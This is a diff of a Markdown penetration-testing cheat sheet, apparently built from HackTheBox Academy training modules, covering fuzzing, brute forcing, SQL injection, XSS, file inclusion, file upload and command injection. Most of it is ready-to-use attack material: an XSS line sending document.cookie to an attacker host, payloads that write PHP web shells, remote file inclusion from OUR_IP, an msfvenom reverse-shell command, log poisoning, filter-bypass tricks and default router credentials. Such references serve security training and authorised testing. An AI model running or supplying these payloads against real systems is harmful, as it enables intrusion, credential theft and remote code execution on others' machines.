+| `zip2john ZIP.zip > zip.hash`                                                                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.                                            |
+| `john --wordlist=rockyou.txt zip.hash`                                                                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.                                                            |
+| `bitlocker2john -i Backup.vhd > backup.hashes`                                                               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.                            |
+| `file GZIP.gzip`                                                                                             | Uses the Linux-based file tool to gather file format information.                                                                              |
+| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done`  | Script that runs a for-loop to extract files from an archive.                                                                                  |
 
 
 ## Attacking common services
@@ -1279,26 +1355,739 @@ By leveraging the Wayback Machine, you can gain a historical perspective on your
 |`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`|Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host.|
 |`zip -r ilfreight_bh.zip *.json`|Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI.|
 
-## XSS
+## Using Web proxies
 
-| Code                                                                                          | Description                       |
-| --------------------------------------------------------------------------------------------- | --------------------------------- |
-| **XSS Payloads**                                                                              |                                   |
-| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
-| `<plaintext>`                                                                                 | Basic XSS Payload                 |
-| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
-| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
-| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
-| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
-| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
-| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
-| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
-| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
-| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
-| **Commands**                                                                                  |                                   |
-| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
-| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
-| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
+### Burp Shortcuts
+
+| **Shortcut**     | **Description**  |
+| ---------------- | ---------------- |
+| [`CTRL+R`]       | Send to repeater |
+| [`CTRL+SHIFT+R`] | Go to repeater   |
+| [`CTRL+I`]       | Send to intruder |
+| [`CTRL+SHIFT+I`] | Go to intruder   |
+| [`CTRL+U`]       | URL encode       |
+| [`CTRL+SHIFT+U`] | URL decode       |
+
+### ZAP Shortcuts
+
+|**Shortcut**|**Description**|
+|---|---|
+|[`CTRL+B`]|Toggle intercept on/off|
+|[`CTRL+R`]|Go to replacer|
+|[`CTRL+E`]|Go to encode/decode/hash|
+
+### Firefox Shortcuts
+
+| **Shortcut**     | **Description**    |
+| ---------------- | ------------------ |
+| [`CTRL+SHIFT+R`] | Force Refresh Page |
+
+
+## Fuzzing with Ffuf
+
+|**Command**|**Description**|
+|---|---|
+|`ffuf -h`|ffuf help|
+|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`|Directory Fuzzing|
+|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`|Extension Fuzzing|
+|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`|Page Fuzzing|
+|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`|Recursive Fuzzing|
+|`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`|Sub-domain Fuzzing|
+|`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`|VHost Fuzzing|
+|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`|Parameter Fuzzing - GET|
+|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Parameter Fuzzing - POST|
+|`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Value Fuzzing|
+
+### Wordlists
+
+|**Command**|**Description**|
+|---|---|
+|`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`|Directory/Page Wordlist|
+|`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`|Extensions Wordlist|
+|`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`|Domain Wordlist|
+|`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`|Parameters Wordlist|
+
+### Misc
+
+| **Command**                                                                                                                   | **Description**          |
+| ----------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
+| `sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`                                                                     | Add DNS entry            |
+| `for i in $(seq 1 1000); do echo $i >> ids.txt; done`                                                                         | Create Sequence Wordlist |
+| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST             |
+
+
+## Login Brute Forcing
+
+A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.
+
+### Factors Influencing Brute Force Attacks
+
+- Complexity of the password or key
+- Computational power available to the attacker
+- Security measures in place
+
+### How Brute Forcing Works
+
+1. Start: The attacker initiates the brute force process.
+2. Generate Possible Combination: The software generates a potential password or key combination.
+3. Apply Combination: The generated combination is attempted against the target system.
+4. Check if Successful: The system evaluates the attempted combination.
+5. Access Granted (if successful): The attacker gains unauthorized access.
+6. End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.
+
+### Types of Brute Forcing
+
+|Attack Type|Description|Best Used When|
+|---|---|---|
+|Simple Brute Force|Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols).|When there is no prior information about the password.|
+|Dictionary Attack|Uses a pre-compiled list of common passwords.|When the password is likely weak or follows common patterns.|
+|Hybrid Attack|Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words.|When the target uses slightly modified versions of common passwords.|
+|Credential Stuffing|Uses leaked credentials from other breaches to access different services where users may have reused passwords.|When you have a set of leaked credentials, and the target may reuse passwords.|
+|Password Spraying|Attempts common passwords across many accounts to avoid detection.|When account lockout policies are in place.|
+|Rainbow Table Attack|Uses precomputed tables of password hashes to reverse them into plaintext passwords.|When a large number of password hashes need cracking, and storage for tables is available.|
+|Reverse Brute Force|Targets a known password against multiple usernames.|When there’s a suspicion of password reuse across multiple accounts.|
+|Distributed Brute Force|Distributes brute force attempts across multiple machines to speed up the process.|When the password is highly complex, and a single machine isn't powerful enough.|
+
+### Default Credentials
+
+- Default Usernames: Pre-set usernames that are widely known
+- Default Passwords: Pre-set, easily guessable passwords that come with devices and software
+
+|Device|Username|Password|
+|---|---|---|
+|Linksys Router|admin|admin|
+|Netgear Router|admin|password|
+|TP-Link Router|admin|admin|
+|Cisco Router|cisco|cisco|
+|Ubiquiti UniFi AP|ubnt|ubnt|
+
+### Brute-Forcing Tools
+
+#### Hydra
+
+- Fast network login cracker
+- Supports numerous protocols
+- Uses parallel connections for speed
+- Flexible and adaptable
+- Relatively easy to use
+
+
+```bash
+hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]
+```
+
+|Hydra Service|Service/Protocol|Description|Example Command|
+|---|---|---|---|
+|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
+|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
+|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
+
+#### Medusa
+
+- Fast, massively parallel, modular login brute-forcer
+- Supports a wide array of services
+
+
+```bash
+medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+```
+
+|Medusa Module|Service/Protocol|Description|Example Command|
+|---|---|---|---|
+|ssh|Secure Shell (SSH)|Brute force SSH login for the `admin` user.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh`|
+|ftp|File Transfer Protocol (FTP)|Brute force FTP with multiple usernames and passwords using 5 parallel threads.|`medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5`|
+|rdp|Remote Desktop Protocol (RDP)|Brute force RDP login.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp`|
+|http-get|HTTP Web Services|Brute force HTTP Basic Authentication.|`medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET`|
+|ssh|Secure Shell (SSH)|Stop after the first valid SSH login is found.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f`|
+
+#### Custom Wordlists
+
+Username Anarchy generates potential usernames based on a target's name.
+
+|Command|Description|
+|---|---|
+|`username-anarchy Jane Smith`|Generate possible usernames for "Jane Smith"|
+|`username-anarchy -i names.txt`|Use a file (`names.txt`) with names for input. Can handle space, CSV, or TAB delimited names.|
+|`username-anarchy -a --country us`|Automatically generate usernames using common names from the US dataset.|
+|`username-anarchy -l`|List available username format plugins.|
+|`username-anarchy -f format1,format2`|Use specific format plugins for username generation (comma-separated).|
+|`username-anarchy -@ example.com`|Append `@example.com` as a suffix to each username.|
+|`username-anarchy --case-insensitive`|Generate usernames in case-insensitive (lowercase) format.|
+
+CUPP (Common User Passwords Profiler) creates personalized password wordlists based on gathered intelligence.
+
+|Command|Description|
+|---|---|
+|`cupp -i`|Generate wordlist based on personal information (interactive mode).|
+|`cupp -w profiles.txt`|Generate a wordlist from a predefined profile file.|
+|`cupp -l`|Download popular password lists like `rockyou.txt`.|
+
+#### Password Policy Filtering
+
+Password policies often dictate specific requirements for password strength, such as minimum length, inclusion of certain character types, or exclusion of common patterns. `grep` combined with regular expressions can be a powerful tool for filtering wordlists to identify passwords that adhere to a given policy. Below is a table summarizing common password policy requirements and the corresponding `grep` regex patterns to apply:
+
+|Policy Requirement|Grep Regex Pattern|Explanation|
+|---|---|---|
+|Minimum Length (e.g., 8 characters)|`grep -E '^.{8,}$' wordlist.txt`|`^` matches the start of the line, `.` matches any character, `{8,}` matches 8 or more occurrences, `$` matches the end of the line.|
+|At Least One Uppercase Letter|`grep -E '[A-Z]' wordlist.txt`|`[A-Z]` matches any uppercase letter.|
+|At Least One Lowercase Letter|`grep -E '[a-z]' wordlist.txt`|`[a-z]` matches any lowercase letter.|
+|At Least One Digit|`grep -E '[0-9]' wordlist.txt`|`[0-9]` matches any digit.|
+|At Least One Special Character|`grep -E '[!@#$%^&*()_+-=[]{};':"\,.<>/?]' wordlist.txt`|`[!@#$%^&*()_+-=[]{};':"\,.<>/?]` matches any special character (symbol).|
+|No Consecutive Repeated Characters|`grep -E '(.)\1' wordlist.txt`|`(.)` captures any character, `\1` matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use `grep -v` to invert the match.|
+|Exclude Common Patterns (e.g., "password")|`grep -v -i 'password' wordlist.txt`|`-v` inverts the match, `-i` makes the search case-insensitive. This pattern will exclude any line containing "password" (or "Password", "PASSWORD", etc.).|
+|Exclude Dictionary Words|`grep -v -f dictionary.txt wordlist.txt`|`-f` reads patterns from a file. `dictionary.txt` should contain a list of common dictionary words, one per line.|
+|Combination of Requirements|`grep -E '^.{8,}$' wordlist.txt \| grep -E '[A-Z]'`|This command filters a wordlist to meet multiple password policy requirements. It first ensures that each word has a minimum length of 8 characters (`grep -E '^.{8,}$'`), and then it pipes the result into a second `grep` command to match only words that contain at least one uppercase letter (`grep -E '[A-Z]'`). This approach ensures the filtered passwords meet both the length and uppercase letter criteria.|
+
+
+## SQL injection fundamentals
+
+### MySQL
+
+|**Command**|**Description**|
+|---|---|
+|**General**||
+|`mysql -u root -h docker.hackthebox.eu -P 3306 -p`|login to mysql database|
+|`SHOW DATABASES`|List available databases|
+|`USE users`|Switch to database|
+|**Tables**||
+|`CREATE TABLE logins (id INT, ...)`|Add a new table|
+|`SHOW TABLES`|List available tables in current database|
+|`DESCRIBE logins`|Show table properties and columns|
+|`INSERT INTO table_name VALUES (value_1,..)`|Add values to table|
+|`INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`|Add values to specific columns in a table|
+|`UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`|Update table values|
+|**Columns**||
+|`SELECT * FROM table_name`|Show all columns in a table|
+|`SELECT column1, column2 FROM table_name`|Show specific columns in a table|
+|`DROP TABLE logins`|Delete a table|
+|`ALTER TABLE logins ADD newColumn INT`|Add new column|
+|`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`|Rename column|
+|`ALTER TABLE logins MODIFY oldColumn DATE`|Change column datatype|
+|`ALTER TABLE logins DROP oldColumn`|Delete column|
+|**Output**||
+|`SELECT * FROM logins ORDER BY column_1`|Sort by column|
+|`SELECT * FROM logins ORDER BY column_1 DESC`|Sort by column in descending order|
+|`SELECT * FROM logins ORDER BY column_1 DESC, id ASC`|Sort by two-columns|
+|`SELECT * FROM logins LIMIT 2`|Only show first two results|
+|`SELECT * FROM logins LIMIT 1, 2`|Only show first two results starting from index 2|
+|`SELECT * FROM table_name WHERE <condition>`|List results that meet a condition|
+|`SELECT * FROM logins WHERE username LIKE 'admin%'`|List results where the name is similar to a given string|
+
+### MySQL Operator Precedence
+
+- Division (`/`), Multiplication (`*`), and Modulus (`%`)
+- Addition (`+`) and Subtraction (`-`)
+- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
+- NOT (`!`)
+- AND (`&&`)
+- OR (`||`)
+
+### SQL Injection
+
+|**Payload**|**Description**|
+|---|---|
+|**Auth Bypass**||
+|`admin' or '1'='1`|Basic Auth Bypass|
+|`admin')-- -`|Basic Auth Bypass With comments|
+|[Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)||
+|**Union Injection**||
+|`' order by 1-- -`|Detect number of columns using `order by`|
+|`cn' UNION select 1,2,3-- -`|Detect number of columns using Union injection|
+|`cn' UNION select 1,@@version,3,4-- -`|Basic Union injection|
+|`UNION select username, 2, 3, 4 from passwords-- -`|Union injection for 4 columns|
+|**DB Enumeration**||
+|`SELECT @@version`|Fingerprint MySQL with query output|
+|`SELECT SLEEP(5)`|Fingerprint MySQL with no output|
+|`cn' UNION select 1,database(),2,3-- -`|Current database name|
+|`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`|List all databases|
+|`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`|List all tables in a specific database|
+|`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`|List all columns in a specific table|
+|`cn' UNION select 1, username, password, 4 from dev.credentials-- -`|Dump data from a table in another database|
+|**Privileges**||
+|`cn' UNION SELECT 1, user(), 3, 4-- -`|Find current user|
+|`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`|Find if user has admin privileges|
+|`cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`|Find if all user privileges|
+|`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`|Find which directories can be accessed through MySQL|
+|**File Injection**||
+|`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`|Read local file|
+|`select 'file written successfully!' into outfile '/var/www/html/proof.txt'`|Write a string to a local file|
+|`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`|Write a web shell into the base web directory|
+
+
+## SQLMap essentials
+
+
+|**Command**|**Description**|
+|---|---|
+|`sqlmap -h`|View the basic help menu|
+|`sqlmap -hh`|View the advanced help menu|
+|`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`|Run `SQLMap` without asking for user input|
+|`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`|`SQLMap` with POST request|
+|`sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`|POST request specifying an injection point with an asterisk|
+|`sqlmap -r req.txt`|Passing an HTTP request file to `SQLMap`|
+|`sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`|Specifying a cookie header|
+|`sqlmap -u www.target.com --data='id=1' --method PUT`|Specifying a PUT request|
+|`sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`|Store traffic to an output file|
+|`sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`|Specify verbosity level|
+|`sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`|Specifying a prefix or suffix|
+|`sqlmap -u www.example.com/?id=1 -v 3 --level=5`|Specifying the level and risk|
+|`sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`|Basic DB enumeration|
+|`sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`|Table enumeration|
+|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`|Table/row enumeration|
+|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`|Conditional enumeration|
+|`sqlmap -u "http://www.example.com/?id=1" --schema`|Database schema enumeration|
+|`sqlmap -u "http://www.example.com/?id=1" --search -T user`|Searching for data|
+|`sqlmap -u "http://www.example.com/?id=1" --passwords --batch`|Password enumeration and cracking|
+|`sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`|Anti-CSRF token bypass|
+|`sqlmap --list-tampers`|List all tamper scripts|
+|`sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`|Check for DBA privileges|
+|`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`|Reading a local file|
+|`sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`|Writing a file|
+|`sqlmap -u "http://www.example.com/?id=1" --os-shell`|Spawning an OS shell|
 
 
 
+##  Cross-Site Scripting XSS
+
+
+|Code|Description|
+|---|---|
+|**XSS Payloads**||
+|`<script>alert(window.origin)</script>`|Basic XSS Payload|
+|`<plaintext>`|Basic XSS Payload|
+|`<script>print()</script>`|Basic XSS Payload|
+|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
+|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
+|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
+|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
+|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
+|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
+|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
+|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|
+|**Commands**||
+|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run `xsstrike` on a url parameter|
+|`sudo nc -lvnp 80`|Start `netcat` listener|
+|`sudo php -S 0.0.0.0:80`|Start `PHP` server|
+
+
+## File inclusion
+
+### Local File Inclusion
+
+|**Command**|**Description**|
+|---|---|
+|**Basic LFI**||
+|`/index.php?language=/etc/passwd`|Basic LFI|
+|`/index.php?language=../../../../etc/passwd`|LFI with path traversal|
+|`/index.php?language=/../../../etc/passwd`|LFI with name prefix|
+|`/index.php?language=./languages/../../../../etc/passwd`|LFI with approved path|
+|**LFI Bypasses**||
+|`/index.php?language=....//....//....//....//etc/passwd`|Bypass basic path traversal filter|
+|`/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`|Bypass filters with URL encoding|
+|`/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`|Bypass appended extension with path truncation (obsolete)|
+|`/index.php?language=../../../../etc/passwd%00`|Bypass appended extension with null byte (obsolete)|
+|`/index.php?language=php://filter/read=convert.base64-encode/resource=config`|Read PHP with base64 filter|
+
+### Remote Code Execution
+
+|**Command**|**Description**|
+|---|---|
+|**PHP Wrappers**||
+|`/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`|RCE with data wrapper|
+|`curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`|RCE with input wrapper|
+|`curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`|RCE with expect wrapper|
+|**RFI**||
+|`echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>`|Host web shell|
+|`/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`|Include remote PHP web shell|
+|**LFI + Upload**||
+|`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`|Create malicious image|
+|`/index.php?language=./profile_images/shell.gif&cmd=id`|RCE with malicious uploaded image|
+|`echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`|Create malicious zip archive 'as jpg'|
+|`/index.php?language=zip://shell.zip%23shell.php&cmd=id`|RCE with malicious uploaded zip|
+|`php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`|Create malicious phar 'as jpg'|
+|`/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`|RCE with malicious uploaded phar|
+|**Log Poisoning**||
+|`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`|Read PHP session parameters|
+|`/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`|Poison PHP session with web shell|
+|`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`|RCE through poisoned PHP session|
+|`curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'`|Poison server log|
+|`/index.php?language=/var/log/apache2/access.log&cmd=id`|RCE through poisoned PHP session|
+
+### Misc
+
+|**Command**|**Description**|
+|---|---|
+|`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`|Fuzz page parameters|
+|`ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`|Fuzz LFI payloads|
+|`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`|Fuzz webroot path|
+|`ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`|Fuzz server configurations|
+|[LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)||
+|[LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)||
+|[Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)||
+|[Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)||
+|[Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)||
+|[Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)||
+
+## File Inclusion Functions
+
+|**Function**|**Read Content**|**Execute**|**Remote URL**|
+|---|:-:|:-:|:-:|
+|**PHP**||||
+|`include()`/`include_once()`|Yes|Yes|Yes|
+|`require()`/`require_once()`|Yes|Yes|No|
+|`file_get_contents()`|Yes|No|Yes|
+|`fopen()`/`file()`|Yes|No|No|
+|**NodeJS**||||
+|`fs.readFile()`|Yes|No|No|
+|`fs.sendFile()`|Yes|No|No|
+|`res.render()`|Yes|Yes|No|
+|**Java**||||
+|`include`|Yes|No|No|
+|`import`|Yes|Yes|Yes|
+|**.NET**||||
+|`@Html.Partial()`|Yes|No|No|
+|`@Html.RemotePartial()`|Yes|No|Yes|
+|`Response.WriteFile()`|Yes|No|No|
+|`include`|Yes|Yes|Yes|
+
+
+## File Upload Attacks
+
+### Web Shells
+
+|**Web Shell**|**Description**|
+|---|---|
+|`<?php file_get_contents('/etc/passwd'); ?>`|Basic PHP File Read|
+|`<?php system('hostname'); ?>`|Basic PHP Command Execution|
+|`<?php system($_REQUEST['cmd']); ?>`|Basic PHP Web Shell|
+|`<% eval request('cmd') %>`|Basic ASP Web Shell|
+|`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`|Generate PHP reverse shell|
+|[PHP Web Shell](https://github.com/Arrexel/phpbash)|PHP Web Shell|
+|[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)|PHP Reverse Shell|
+|[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)|List of Web Shells and Reverse Shells|
+
+### Bypasses
+
+|**Command**|**Description**|
+|---|---|
+|**Client-Side Bypass**||
+|`[CTRL+SHIFT+C]`|Toggle Page Inspector|
+|**Blacklist Bypass**||
+|`shell.phtml`|Uncommon Extension|
+|`shell.pHp`|Case Manipulation|
+|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)|List of PHP Extensions|
+|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)|List of ASP Extensions|
+|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)|List of Web Extensions|
+|**Whitelist Bypass**||
+|`shell.jpg.php`|Double Extension|
+|`shell.php.jpg`|Reverse Double Extension|
+|`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`|Character Injection - Before/After Extension|
+|**Content/Type Bypass**||
+|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)|List of Web Content-Types|
+|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)|List of All Content-Types|
+|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)|List of File Signatures/Magic Bytes|
+
+### Limited Uploads
+
+|**Potential Attack**|**File Types**|
+|---|---|
+|`XSS`|HTML, JS, SVG, GIF|
+|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|
+|`DoS`|ZIP, JPG, PNG|
+
+
+
+## Commands Injections
+
+### Injection Operators
+
+|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
+|---|---|---|---|
+|Semicolon|`;`|`%3b`|Both|
+|New Line|`\n`|`%0a`|Both|
+|Background|`&`|`%26`|Both (second output generally shown first)|
+|Pipe|`\|`|`%7c`|Both (only second output is shown)|
+|AND|`&&`|`%26%26`|Both (only if first succeeds)|
+|OR|`\|`|`%7c%7c`|Second (only if first fails)|
+|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
+|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|
+
+---
+
+### Linux: Filtered Character Bypass
+
+|Code|Description|
+|---|---|
+|`printenv`|Can be used to view all environment variables|
+|**Spaces**||
+|`%09`|Using tabs instead of spaces|
+|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`)|
+|`{ls,-la}`|Commas will be replaced with spaces|
+|**Other Characters**||
+|`${PATH:0:1}`|Will be replaced with `/`|
+|`${LS_COLORS:10:1}`|Will be replaced with `;`|
+|`$(tr '!-}' '"-~'<<<[)`|Shift character by one (`[` -> `\`)|
+
+---
+
+### Linux: Blacklisted Command Bypass
+
+|Code|Description|
+|---|---|
+|**Character Insertion**||
+|`'` or `"`|Total must be even|
+|`$@` or `\`|Linux only|
+|**Case Manipulation**||
+|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|Execute command regardless of cases|
+|`$(a="WhOaMi";printf %s "${a,,}")`|Another variation of the technique|
+|**Reversed Commands**||
+|`echo 'whoami' \| rev`|Reverse a string|
+|`$(rev<<<'imaohw')`|Execute reversed command|
+|**Encoded Commands**||
+|`echo -n 'cat /etc/passwd \| grep 33' \| base64`|Encode a string with base64|
